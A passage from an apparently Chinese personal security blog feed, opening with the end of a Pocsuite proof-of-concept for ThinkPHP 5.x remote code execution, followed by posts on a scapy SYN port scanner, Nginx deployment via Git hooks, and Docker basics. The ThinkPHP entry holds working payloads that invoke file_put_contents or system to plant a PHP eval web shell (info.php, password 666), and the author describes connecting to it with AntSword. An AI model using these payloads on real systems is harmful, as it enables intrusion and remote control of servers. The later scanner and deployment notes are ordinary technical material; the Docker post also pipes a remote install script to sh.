class="string">'VerifyInfo'</span>: &#123;&#125;&#125;</span><br><span class="line">            result[<span class="string">'VerifyInfo'</span>][<span class="string">'payload'</span>] = payload</span><br><span class="line">        <span class="keyword">return</span> self.parse_result(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_attack</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        info = &#123;</span><br><span class="line">            <span class="string">'ResultCode'</span>: &#123;</span><br><span class="line">                <span class="string">'a'</span>: <span class="keyword">False</span>,</span><br><span class="line">                <span class="string">'b'</span>: <span class="keyword">False</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        payload1 = self.url + <span class="string">'/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array'</span> \</span><br><span class="line">                              <span class="string">'&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20eval($_POST[666]);?%3E'</span></span><br><span class="line">        payload2 = self.url + <span class="string">'/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array'</span> \</span><br><span class="line">                              <span class="string">'&amp;vars[0]=system&amp;vars[1][]=echo%20%22&lt;?php%20eval($_POST[666]);?&gt;%22%20&gt;%20info.php'</span></span><br><span class="line">        req.get(payload1)</span><br><span class="line">        <span class="keyword">if</span> req.get(self.url + <span class="string">'/info.php'</span>).status_code == <span class="number">200</span>:</span><br><span class="line">            result = &#123;<span class="string">'AttackInfo'</span>: &#123;&#125;&#125;</span><br><span class="line">            info[<span class="string">'ResultCode'</span>][<span class="string">'a'</span>] = <span class="keyword">True</span></span><br><span class="line">            result[<span class="string">'AttackInfo'</span>][<span class="string">'payload'</span>] = payload1</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            req.get(payload2)</span><br><span class="line">            <span class="keyword">if</span> req.get(self.url + <span class="string">'/info.php'</span>).status_code == <span class="number">200</span>:</span><br><span class="line">                result = &#123;<span class="string">'AttackInfo'</span>: &#123;&#125;&#125;</span><br><span class="line">                info[<span class="string">'ResultCode'</span>][<span class="string">'b'</span>] = <span class="keyword">True</span></span><br><span class="line">                result[<span class="string">'AttackInfo'</span>][<span class="string">'payload'</span>] = payload2</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> info[<span class="string">'ResultCode'</span>][<span class="string">'a'</span>] <span class="keyword">or</span> info[<span class="string">'ResultCode'</span>][<span class="string">'b'</span>]:</span><br><span class="line">            result[<span class="string">'AttackInfo'</span>][<span class="string">'shell'</span>] = self.url+<span class="string">'/info.php'</span></span><br><span class="line">            result[<span class="string">'AttackInfo'</span>][<span class="string">'pass'</span>] = <span class="string">'666'</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.parse_result(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_result</span><span class="params">(self, result)</span>:</span></span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">'The vulnerability does not appear to be available!'</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register(ThinkphpPoC)</span><br></pre></td></tr></table></figure><h2 id="Poc测试"><a href="#Poc测试" class="headerlink" title="Poc测试"></a>Poc测试</h2><p><img src="thinkphp-5.x-pocsuite.JPG" alt=""></p><p>还是第一次用Pocsuite，写的不好…你来打我呀</p><p>相比pentestDB等，Pocsuite体验非常不错，打算以后就一直使用Pocsuite好了(如果有更好的框架请务必私信我)</p><p>verify模式忘截图了</p><p>attack模式会直接在同目录下写一句话木马</p><p>祭出法器中国蚁剑</p><p><img src="thinkphp-5.x-yijian2.JPG" alt=""></p><p>文件是info.php 密码666</p><p>很好</p><h2 id="enjoy-it"><a href="#enjoy-it" class="headerlink" title="enjoy it"></a>enjoy it</h2><p><img src="thinkphp-5.x-yijian.JPG" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;半醉半醒日复日,花落花开年复年。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;2019了。&lt;/p&gt;
&lt;h2 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;漏洞分析&quot;&gt;&lt;/a&gt;漏洞分析&lt;/h2&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://t43wiu6.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="thinkphp" scheme="https://t43wiu6.github.io/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>python打造基于scapy的扫描器</title>
    <link href="https://t43wiu6.github.io/2018/11/17/web-scan/"/>
    <id>https://t43wiu6.github.io/2018/11/17/web-scan/</id>
    <published>2018-11-17T12:14:38.000Z</published>
    <updated>2019-04-09T13:26:11.543Z</updated>
    
    <content type="html"><![CDATA[<h2 id="准备事宜"><a href="#准备事宜" class="headerlink" title="准备事宜"></a>准备事宜</h2><p>scapy库<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/secdev/scapy.git</span><br><span class="line"><span class="built_in">cd</span> ./scapy</span><br><span class="line">python setup.py</span><br></pre></td></tr></table></figure></p><h2 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h2><a id="more"></a><p>放个三次握手原理图<br><img src="web-scan-1.png" alt=""><br>与被扫描机进行SYN握手，返回数据包不带 RST 标识就是开放了端口<br>基本思路参考</p><ul><li><a href="https://scapy.readthedocs.io/en/latest/usage.html#starting-scapy" target="_blank" rel="noopener">scapy官方文档</a></li><li><a href="https://www.freebuf.com/sectool/94507.html" target="_blank" rel="noopener">如何用Scapy写一个端口扫描器？</a></li><li><a href="https://www.freebuf.com/sectool/125491.html" target="_blank" rel="noopener">Python的无状态SYN快速扫描 </a></li></ul><p>完整的项目我放到了github上</p><ul><li><a href="https://github.com/sherdh/pineScan" target="_blank" rel="noopener">这里</a></li></ul><h2 id="预定义的全局变量"><a href="#预定义的全局变量" class="headerlink" title="预定义的全局变量"></a>预定义的全局变量</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#目标ip与端口</span></span><br><span class="line">ports = <span class="string">''</span></span><br><span class="line">target = <span class="string">''</span></span><br><span class="line"><span class="comment">#定义是否用socket扫描，默认用syn</span></span><br><span class="line">socket_scan_mode = <span class="keyword">False</span></span><br><span class="line"><span class="comment">#合计socket扫到端口</span></span><br><span class="line">socket_flag = <span class="number">0</span></span><br><span class="line"><span class="comment"># Pn = True</span></span><br><span class="line"><span class="comment"># socket扫描多线程锁</span></span><br><span class="line">lock = threading.Semaphore(value=<span class="number">1</span>)</span><br><span class="line"><span class="comment">#默认扫描的端口</span></span><br><span class="line">default_ports = [...]</span><br><span class="line"><span class="comment">#端口可能对应的服务</span></span><br><span class="line">port_list = &#123;...&#125;</span><br></pre></td></tr></table></figure><h2 id="getopt模块处理用户输入"><a href="#getopt模块处理用户输入" class="headerlink" title="getopt模块处理用户输入"></a>getopt模块处理用户输入</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line"><span class="comment">#用法提示</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage: pineScan.py -t target_host (-p)"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">" -h --help"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">" -t --target"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"example: -t 127.0.0.1"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">" -p --port"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"example: -p 80,445"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">" -s --socket"</span></span><br><span class="line"><span class="comment">#print " -Pn --skip host discovery"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> ports</span><br><span class="line"><span class="keyword">global</span> target</span><br><span class="line"><span class="keyword">global</span> socket_scan_mode</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="comment">#对用户输入的参数解析</span></span><br><span class="line">opts, args = getopt.getopt(sys.argv[<span class="number">1</span>:],<span class="string">"hp:t:s"</span>,[<span class="string">"help"</span>,<span class="string">"port"</span>,<span class="string">"target"</span>,<span class="string">"socket"</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> o,a <span class="keyword">in</span> opts:</span><br><span class="line"><span class="keyword">if</span> o <span class="keyword">in</span> (<span class="string">"-h"</span>,<span class="string">"--help"</span>):</span><br><span class="line">usage()</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-t"</span>,<span class="string">"--target"</span>):</span><br><span class="line">target = a</span><br><span class="line"><span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-p"</span>,<span class="string">"--port"</span>):</span><br><span class="line">ports = a</span><br><span class="line"><span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-s"</span>,<span class="string">"--socket"</span>):</span><br><span class="line">socket_scan_mode = <span class="keyword">True</span></span><br><span class="line"><span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-Pn"</span>):</span><br><span class="line">Pn = <span class="keyword">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Unhandled Option"</span></span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> target:</span><br><span class="line"><span class="comment">#调用扫描</span></span><br><span class="line">portScan(target, ports)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">usage()</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">print</span> str(e)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line">usage()</span><br></pre></td></tr></table></figure><h2 id="socket扫描核心代码"><a href="#socket扫描核心代码" class="headerlink" title="socket扫描核心代码"></a>socket扫描核心代码</h2><p>socket扫描写都写了，懒得删了…emmmm<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">socket_scan</span><span class="params">(target, port)</span>:</span></span><br><span class="line"><span class="comment">#socket全连接</span></span><br><span class="line"><span class="keyword">global</span> socket_flag</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment">#设置超时</span></span><br><span class="line">conn.settimeout(<span class="number">2</span>)</span><br><span class="line">conn.connect((target, port))</span><br><span class="line">lock.acquire()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] %d/tcp open   %s\r'</span> % (port,port_list[port])</span><br><span class="line"><span class="comment">#计算开启的端口</span></span><br><span class="line">socket_flag = socket_flag + <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="comment">#线程释放</span></span><br><span class="line">lock.release()</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></p><h2 id="syn扫描核心代码"><a href="#syn扫描核心代码" class="headerlink" title="syn扫描核心代码"></a>syn扫描核心代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">syn_scan</span><span class="params">(ip,ports)</span>:</span></span><br><span class="line"><span class="comment">#构造数据包</span></span><br><span class="line">ans,unans=sr(IP(dst=ip)/TCP(dport=ports, flags=<span class="string">'S'</span>),timeout = <span class="number">5</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"PORT      STATE    SERVICE"</span></span><br><span class="line"><span class="keyword">for</span> snd,rcv <span class="keyword">in</span> ans:</span><br><span class="line"><span class="comment">#从返回包读取数据</span></span><br><span class="line">port = rcv.sprintf(<span class="string">"%IP.sport%"</span>)</span><br><span class="line">service = rcv.sprintf(<span class="string">"%TCP.sport%"</span>)</span><br><span class="line">flag = rcv.sprintf(<span class="string">"%TCP.flags%"</span>)</span><br><span class="line"><span class="keyword">if</span> flag == <span class="string">'SA'</span>:</span><br><span class="line"><span class="comment">#SA是开放了端口</span></span><br><span class="line"><span class="keyword">if</span> is_number(service):</span><br><span class="line"><span class="comment">#包中信息的读取若为数字，调用字典查询可能的对应服务并替换</span></span><br><span class="line"><span class="keyword">if</span> service <span class="keyword">in</span> port_list.keys():</span><br><span class="line"> service = port_list[service]</span><br><span class="line"> <span class="keyword">else</span>:</span><br><span class="line"> service = <span class="string">'unknown'</span></span><br><span class="line"> <span class="comment">#格式化输出</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'%-10.5sopen     %s'</span> % (port,service)</span><br></pre></td></tr></table></figure><h2 id="扫描调用模块"><a href="#扫描调用模块" class="headerlink" title="扫描调用模块"></a>扫描调用模块</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#以逗号分割端口号</span></span><br><span class="line">ports = ports.split(<span class="string">","</span>)</span><br><span class="line"><span class="comment">#对string类型列表处理成int类型</span></span><br><span class="line">ports = [int(i) <span class="keyword">for</span> i <span class="keyword">in</span> ports]</span><br><span class="line"><span class="comment">#判断是socket扫描还是syn扫描</span></span><br><span class="line"><span class="keyword">if</span> socket_scan_mode:</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line"><span class="comment">#多线程调用socket</span></span><br><span class="line">thread = threading.Thread(target=socket_scan, args=(target, int(port)))</span><br><span class="line">thread.start()</span><br><span class="line"><span class="keyword">if</span> socket_flag == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"socket scan done!but no port is open"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment">#syn中整个列表传输执行比for循环更快</span></span><br><span class="line">syn_scan(target,ports)</span><br></pre></td></tr></table></figure><h2 id="实际结果展示"><a href="#实际结果展示" class="headerlink" title="实际结果展示"></a>实际结果展示</h2><p><img src="web-scan-2.png" alt=""><br><img src="web-scan-3.png" alt=""><br>还算可以，技术所限，大佬轻喷</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;准备事宜&quot;&gt;&lt;a href=&quot;#准备事宜&quot; class=&quot;headerlink&quot; title=&quot;准备事宜&quot;&gt;&lt;/a&gt;准备事宜&lt;/h2&gt;&lt;p&gt;scapy库&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; https://github.com/secdev/scapy.git&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; ./scapy&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;python setup.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;构思&quot;&gt;&lt;a href=&quot;#构思&quot; class=&quot;headerlink&quot; title=&quot;构思&quot;&gt;&lt;/a&gt;构思&lt;/h2&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://t43wiu6.github.io/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="python" scheme="https://t43wiu6.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>小站迁移记(Nginx自动化部署)</title>
    <link href="https://t43wiu6.github.io/2018/11/09/web-migration/"/>
    <id>https://t43wiu6.github.io/2018/11/09/web-migration/</id>
    <published>2018-11-09T10:24:07.000Z</published>
    <updated>2019-10-12T02:40:12.994Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSH部署阿里云vps"><a href="#SSH部署阿里云vps" class="headerlink" title="SSH部署阿里云vps"></a>SSH部署阿里云vps</h2><p>直接在阿里云控制台导入ssh-keygen生成的秘钥<br><a href="/2018/07/24/git-config/">秘钥生成看这里</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh git@serverip -i ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure></p><h2 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h2><a id="more"></a><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install nginx</span><br><span class="line">/etc/init.d/nginx start</span><br></pre></td></tr></table></figure><p>访问ip,看到<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Welcome to nginx!</span><br></pre></td></tr></table></figure></p><p>配置成功了</p><h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git</span><br><span class="line"><span class="comment">#创建一个git用户,用于运行git服务</span></span><br><span class="line">sudo adduser git</span><br><span class="line"><span class="comment">#导入秘钥到</span></span><br><span class="line">/home/git/.ssh/authorized_keys</span><br><span class="line"><span class="comment">#修改权限</span></span><br><span class="line">chmod 600 authorized_keys</span><br><span class="line"><span class="comment">#初始化git仓库</span></span><br><span class="line">git init --bare blo.git</span><br><span class="line"><span class="comment">#更改所有权</span></span><br><span class="line">sudo chown -R git:git blog.git</span><br><span class="line"><span class="comment">#禁止shell登录</span></span><br><span class="line">修改/etc/passwd的git:x:1003:1003::/home/git:/bin/bash</span><br><span class="line">改为git:x:1003:1003::/home/git:/usr/bin/git-shell</span><br><span class="line"><span class="comment">#克隆远程仓库</span></span><br><span class="line">git <span class="built_in">clone</span> git@serverip:/home/git/blog.git</span><br></pre></td></tr></table></figure><h2 id="配置nginx"><a href="#配置nginx" class="headerlink" title="配置nginx"></a>配置nginx</h2><p>懒的配了,直接把html删了<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> /home/git/blog.git html</span><br></pre></td></tr></table></figure></p><p>从仓库克隆过来直接替换掉</p><h2 id="配置Git钩子hooks"><a href="#配置Git钩子hooks" class="headerlink" title="配置Git钩子hooks"></a>配置Git钩子hooks</h2><p>blog.git文件家里有一个hooks文件夹<br>里边有各种hook例子<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ vim blog.git/hooks/post-receive</span><br></pre></td></tr></table></figure></p><p>写如下代码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> GIT_DIR <span class="comment">#还原环境变量，否则会拉不到代码</span></span><br><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line">git pull origin master</span><br></pre></td></tr></table></figure></p><p>注意要chmod 755 blog.git/hooks/post-receive</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>本地修改hexo配置文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  <span class="comment"># 部署到我的git仓库</span></span><br><span class="line">  repo: git@serverip:/home/git/blog.git</span><br><span class="line">  <span class="comment"># 分支默认master</span></span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure></p><ul><li><a href="https://www.jianshu.com/p/59c4fc2684be" target="_blank" rel="noopener">ssh参考</a></li><li><a href="https://www.jianshu.com/p/7cb1a824333e" target="_blank" rel="noopener">nginx安装参考</a></li><li><a href="http://www.runoob.com/linux/nginx-install-setup.html" target="_blank" rel="noopener">nginx配置参考</a></li><li><a href="https://www.jianshu.com/p/0c939f63af41" target="_blank" rel="noopener">Git服务器搭建参考</a></li><li><a href="https://www.jianshu.com/p/a90d7ee90440" target="_blank" rel="noopener">详细参考</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;SSH部署阿里云vps&quot;&gt;&lt;a href=&quot;#SSH部署阿里云vps&quot; class=&quot;headerlink&quot; title=&quot;SSH部署阿里云vps&quot;&gt;&lt;/a&gt;SSH部署阿里云vps&lt;/h2&gt;&lt;p&gt;直接在阿里云控制台导入ssh-keygen生成的秘钥&lt;br&gt;&lt;a href=&quot;/2018/07/24/git-config/&quot;&gt;秘钥生成看这里&lt;/a&gt;&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ssh git@serverip -i ~/.ssh/id_rsa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;安装nginx&quot;&gt;&lt;a href=&quot;#安装nginx&quot; class=&quot;headerlink&quot; title=&quot;安装nginx&quot;&gt;&lt;/a&gt;安装nginx&lt;/h2&gt;
    
    </summary>
    
      <category term="杂七杂八" scheme="https://t43wiu6.github.io/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
      <category term="web" scheme="https://t43wiu6.github.io/tags/web/"/>
    
      <category term="vps" scheme="https://t43wiu6.github.io/tags/vps/"/>
    
      <category term="nginx" scheme="https://t43wiu6.github.io/tags/nginx/"/>
    
      <category term="ssh" scheme="https://t43wiu6.github.io/tags/ssh/"/>
    
  </entry>
  
  <entry>
    <title>Docker从入门到放弃</title>
    <link href="https://t43wiu6.github.io/2018/10/28/docker-1/"/>
    <id>https://t43wiu6.github.io/2018/10/28/docker-1/</id>
    <published>2018-10-29T06:00:17.000Z</published>
    <updated>2019-12-25T01:28:34.091Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2018/10/28/docker-1/docker-1-1.png" alt=""></p><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><a id="more"></a><p>docker三大核心:</p><ul><li>镜像 -镜像不可写</li><li>容器 -容器基于镜像生成(可写)</li><li>仓库 -仓库存储镜像(类似于Git的管理机制)<br><img src="docker-1-2.png" alt=""></li></ul><h2 id="docker的安装"><a href="#docker的安装" class="headerlink" title="docker的安装"></a>docker的安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -qO- https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure><p>安装完后,将docker账户添加到用户组(非root)以便执行,然后登出再登录<br>否则会报no permission</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo groupadd docker</span><br><span class="line">sudo gpasswd -a <span class="variable">$&#123;USER&#125;</span> docker</span><br><span class="line">sudo service docker restart</span><br><span class="line">newgrp - docker</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#启动docker</span></span><br><span class="line">sudo service docker start</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#测试docker</span></span><br><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure><p><a href="http://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank" rel="noopener">菜鸟教程</a></p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 搜索镜像</span></span><br><span class="line">dicker search centos</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载镜像</span></span><br><span class="line">docker pull name</span><br><span class="line"></span><br><span class="line"><span class="comment"># -t 绑定伪终端 -i 保持标准输入 -d 后台运行 -p 端口映射</span></span><br><span class="line">docker run -t -i -p 1000:80 docker.io/centos /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 展示所有镜像</span></span><br><span class="line">docker images</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存镜像</span></span><br><span class="line">docker save -o centos7.tar docker.io/centos</span><br><span class="line"></span><br><span class="line"><span class="comment"># 载入镜像</span></span><br><span class="line">docker load --input centos7.tar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存容器</span></span><br><span class="line">docker <span class="built_in">export</span> id &gt; name.tar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 载入容器成为镜像</span></span><br><span class="line">cat name.tar | docker import - sherdh/ubuntu:v1.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看正在运行的容器(所有)</span></span><br><span class="line">docker ps （-a）</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动/终止容器</span></span><br><span class="line">docker start/stop id (-i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除镜像</span></span><br><span class="line">docker rmi id</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除容器</span></span><br><span class="line">docker rm id</span><br></pre></td></tr></table></figure><h2 id="那些折腾"><a href="#那些折腾" class="headerlink" title="那些折腾"></a>那些折腾</h2><h3 id="第一坑"><a href="#第一坑" class="headerlink" title="第一坑"></a>第一坑</h3><p>不要强制删除一个存在容器依赖的镜像<br>即 -f ,因为会产生各种莫名其妙的问题<br>先删除容器,如果容器在运行，需要先停止<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看所有容器</span></span><br><span class="line">docker ps -a</span><br><span class="line">docker rm 容器id</span><br></pre></td></tr></table></figure></p><h3 id="创建镜像"><a href="#创建镜像" class="headerlink" title="创建镜像"></a>创建镜像</h3><p>基于已有容器<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker commit -a <span class="string">"test"</span> -m <span class="string">"add a new file"</span> 容器id <span class="built_in">test</span>(新镜像名字)</span><br></pre></td></tr></table></figure></p><p>注意是容器id，不是镜像id</p><h3 id="加tag"><a href="#加tag" class="headerlink" title="加tag"></a>加tag</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker tag <span class="built_in">test</span>:latest <span class="built_in">test</span>/<span class="built_in">test</span>:latest</span><br></pre></td></tr></table></figure><p>加了tag后，有两个同id的images<br>这时删除镜像报错<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Error response from daemon: conflict: unable to delete c30eab908457 (must be forced) - image is referenced <span class="keyword">in</span> multiple repositories</span><br></pre></td></tr></table></figure></p><p>删除时需要指定名字，而不是id</p><h3 id="运行报错standard-init-linux-go-178-exec-user-process-caused-“exec-format-error”"><a href="#运行报错standard-init-linux-go-178-exec-user-process-caused-“exec-format-error”" class="headerlink" title="运行报错standard_init_linux.go:178: exec user process caused “exec format error”"></a>运行报错standard_init_linux.go:178: exec user process caused “exec format error”</h3><p>查到原因是docker不支持32位ubuntu…<br>乖乖重装系统去</p><h2 id="使用dockerfile创建镜像"><a href="#使用dockerfile创建镜像" class="headerlink" title="使用dockerfile创建镜像"></a>使用dockerfile创建镜像</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line">MAINTAINER <span class="built_in">test</span> <span class="built_in">test</span>@gmail.com</span><br><span class="line"></span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">"deb http://archive.ubuntu.com/ubuntu/ raring main universe"</span> &gt;&gt; /etc/apt/sources.list</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y nginx inotify-tools apache2 openssh-server</span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">"\ndaemon off;"</span> &gt;&gt; /etc/nginx/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自启动</span></span><br><span class="line">RUN bash -c <span class="string">'echo "firefox" &gt;&gt; /.bashrc'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开端口</span></span><br><span class="line">EXPOSE 5900</span><br><span class="line"></span><br><span class="line"><span class="comment"># 容器启动执行的命令</span></span><br><span class="line">CMD /usr/sbin/nginx</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2018/10/28/docker-1/docker-1-1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;docker&quot;&gt;&lt;a href=&quot;#docker&quot; class=&quot;headerlink&quot; title=&quot;docker&quot;&gt;&lt;/a&gt;docker&lt;/h2&gt;
    
    </summary>
    
      <category term="杂七杂八" scheme="https://t43wiu6.github.io/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
      <category term="docker" scheme="https://t43wiu6.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>BugkuCTF-write-up(WEB题)</title>
    <link href="https://t43wiu6.github.io/2018/09/28/BugkuCTF-write-up/"/>
    <id>https://t43wiu6.github.io/2018/09/28/BugkuCTF-write-up/</id>
    <published>2018-09-29T03:59:43.000Z</published>
    <updated>2018-11-09T21:47:44.000Z</updated>
    
